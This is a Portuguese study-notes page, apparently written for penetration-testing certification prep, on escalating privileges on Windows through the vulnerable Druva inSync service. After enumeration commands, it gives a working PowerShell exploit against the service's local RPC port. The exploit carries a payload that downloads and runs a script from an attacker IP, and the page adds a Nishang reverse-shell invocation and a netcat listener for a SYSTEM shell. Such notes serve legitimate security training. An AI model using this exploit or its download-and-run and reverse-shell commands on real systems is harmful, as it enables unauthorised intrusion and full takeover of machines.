> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/windows-privilege-escalation/vulnerable-services.md).

# Vulnerable Services

* **Enumerando os programas instalados**

```ps
wmic product get name
```

* **Enumerando os portos locais**

```ps
netstat -ano 
```

* Em seguida, vamos mapear o ID do processo (PID) `3324`de volta para o processo em execução.

```
get-process -Id <id>
```

* **Enumerando o serviço em execução**

```ps
get-service | ? {$_.DisplayName -like 'Druva*'}
```

**Prova de conceito (PoC) do PowerShell do Druva inSync**

* Com essas informações em mãos, vamos testar a prova de conceito (PoC) da exploração, que é este pequeno trecho de código em PowerShell.

```ps
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 3456)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")

$payload = "powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.63:8080/shell.ps1')"

$commandString = "C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $payload"

$command = [System.Text.Encoding]::Unicode.GetBytes($commandString)
$length = [System.BitConverter]::GetBytes($command.Length)

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

**Modificando o PowerShell PoC**

* Vamos tentar isso com [o Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) . Baixe o script para a nossa máquina de ataque e renomeie-o para algo simples como `shell.ps1`. Abra o arquivo e adicione o seguinte ao final do script (alterando o endereço IP para corresponder ao nosso endereço e porta de escuta):

```
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 9443
```

* Modifique a `$cmd`variável no script de prova de conceito (PoC) do exploit Druva inSync para baixar nosso shell reverso do PowerShell para a memória

```
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.3:8080/shell.ps1')"
```

* **Capturando uma concha do SISTEMA**

```ps
nc -lvnp 9443
```
